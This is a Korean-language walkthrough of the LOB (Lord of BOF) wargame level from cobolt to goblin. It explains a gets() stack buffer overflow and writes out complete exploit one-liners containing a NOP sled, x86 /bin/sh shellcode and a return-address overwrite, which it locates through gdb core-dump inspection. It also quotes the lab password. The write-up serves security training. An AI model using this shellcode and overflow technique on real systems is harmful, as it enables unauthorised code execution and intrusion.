# LOB - cobolt

이전 문제인 gremlin에서 구한 cobolt와 PW인 hacking exposed를 이용해 로그인한다.



ID : cobolt

PW : hacking exposed



![1567948321473](https://user-images.githubusercontent.com/52530785/64917391-fd077200-d7ca-11e9-9681-cf1d347c96e6.png)



파일 목록을 보면

![1567948350031](https://user-images.githubusercontent.com/52530785/64917392-fd077200-d7ca-11e9-86d4-876c3b120a69.png)

다음과 같이 있다.



```c
vi goblin.c 	명령어를 통해 코드를 확인해본다.
```

![1567948638015](https://user-images.githubusercontent.com/52530785/64917393-fda00880-d7ca-11e9-8a13-735f31d06f1e.png)



버퍼가 16바이트이고 이번엔 strcpy가 아니라 gets로 buffer에 입력 받아서 출력한다.

![1567948814259](https://user-images.githubusercontent.com/52530785/64917394-fda00880-d7ca-11e9-8307-42eb1ffbe57d.png)



여기서도 buffer 크기 + SFP 크기인 20글자를 입력하면 segmentation fault 가 뜬다.

![1567948975295](https://user-images.githubusercontent.com/52530785/64917395-fda00880-d7ca-11e9-8317-b177966ba1a6.png)



파이썬은 이렇게 쓸 수 있다.

```c
python -c 'print "a"*100' | ./goblin
```

![1567949406268](https://user-images.githubusercontent.com/52530785/64917396-fda00880-d7ca-11e9-8105-802ec1f7557e.png)



a가 100개가 들어가도 segmentation fault가 뜨진 않지만 실제로는 fault가 났다.

![1567950186314](https://user-images.githubusercontent.com/52530785/64917397-fe389f00-d7ca-11e9-8cfd-fef5b5a0c266.png)

core 파일이 생겼다.



다음 명령어로 gets에 인자를 주고 argv 에 쉘코드를 넣는다.

```c
python -c 'print "b"*20+"\x61\x61\x61\x61"' | ./goblin `python -c 'print "\x90"*215+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```



```c
gdb -c core		명령어를 실행한다.
```

![1567951343506](https://user-images.githubusercontent.com/52530785/64917399-fe389f00-d7ca-11e9-801b-3be76fa52dba.png)

앞부분에 python -c 'print "b"*20+"\x61\x61\x61\x61"' 로 준게 잘 들어가서 eip가 

0x61616161 이 된 것을 볼 수 있다.



```c
x/100wx $esp+300	명령어를 통해 메모리를 본다.
```

![1567951450569](https://user-images.githubusercontent.com/52530785/64917400-fe389f00-d7ca-11e9-871c-424a21fc8fd2.png)

쉘코드의 위치를 볼 수 있다. 

쉘코드 위의 Nop 영역 중 하나를 고른다.

bffffbfc 를 골랐다.



이제 bffffbfc를 61616161 자리에 넣는다.

하지만 지금은 gremlin과 달리 strcpy가 아니라 gets로 하므로, 

(python -c 'print "b"*20+"\xfc\xfb\xff\xbf"';cat) 를 통해 줘야한다.

goblin의 argv에는 쉘코드를 준다.

```c
(python -c 'print "b"*20+"\xfc\xfb\xff\xbf"';cat) | ./goblin `python -c 'print "\x90"*215+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

![1567951716240](https://user-images.githubusercontent.com/52530785/64917388-fd077200-d7ca-11e9-9040-f358a5796863.png)

쉘이 떴다.



이제 main 디렉터리로 와서 POC를 실행한다.

![1567951789993](https://user-images.githubusercontent.com/52530785/64917390-fd077200-d7ca-11e9-9c79-3c56c573983b.png)

암호가 떴다.
